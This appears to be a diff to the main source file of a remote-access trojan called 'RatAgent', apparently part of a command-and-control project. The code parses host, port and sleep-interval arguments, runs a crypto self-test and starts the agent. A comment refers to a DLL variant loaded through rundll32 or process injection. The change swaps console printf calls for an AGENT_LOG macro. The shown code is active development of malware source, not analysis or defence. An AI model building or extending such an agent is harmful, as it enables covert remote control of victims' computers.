@@ -7,6 +7,7 @@
 //
 // DLL 形态见 agent_dll.cpp（rundll32 / LoadLibrary / 注入）。
 #include "agent_runtime.h"
+#include "agent_debug.h"
 
 #include "crypto.h"
 #include "net.h"
@@ -16,7 +17,7 @@
 
 int main(int argc, char** argv) {
     if (!c2::net_init()) {
-        printf("[-] WSAStartup failed\n");
+        AGENT_LOG("[-] WSAStartup failed\n");
         return -1;
     }
 
@@ -26,8 +27,8 @@ int main(int argc, char** argv) {
     std::string err;
     const std::string argline = c2::agent_args_from_argv(argc, argv);
     if (!c2::agent_parse_args(argline, args, err)) {
-        printf("[-] bad args (%s): %s\n", argline.c_str(), err.c_str());
-        printf("    usage: RatAgent.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]\n");
+        AGENT_LOG("[-] bad args (%s): %s\n", argline.c_str(), err.c_str());
+        AGENT_LOG("    usage: RatAgent.exe [host] [port] [-s sleeptime] [-tcp] [--selftest]\n");
         c2::net_cleanup();
         return 2;
     }
@@ -37,20 +38,20 @@ int main(int argc, char** argv) {
     if (args.selftest) {
         std::string serr;
         bool ok = c2::crypto_selftest(serr);
-        printf("[selftest] crypto: %s%s\n", ok ? "OK" : " FAIL", ok ? "" : serr.c_str());
+        AGENT_LOG("[selftest] crypto: %s%s\n", ok ? "OK" : " FAIL", ok ? "" : serr.c_str());
         c2::net_cleanup();
         return ok ? 0 : 1;
     }
 
     if (!c2::agent_start(args, err)) {
-        printf("[-] agent_start failed: %s\n", err.c_str());
+        AGENT_LOG("[-] agent_start failed: %s\n", err.c_str());
         c2::net_cleanup();
         return 1;
     }
 
     // 阻塞到工作线程结束（Ctrl+C / 进程被杀 / 收到停止事件）
     c2::agent_wait(-1);
-    printf("[*] RatAgent/%s exit\n", c2::agent_version());
+    AGENT_LOG("[*] RatAgent/%s exit\n", c2::agent_version());
     c2::net_cleanup();
     return 0;
 }
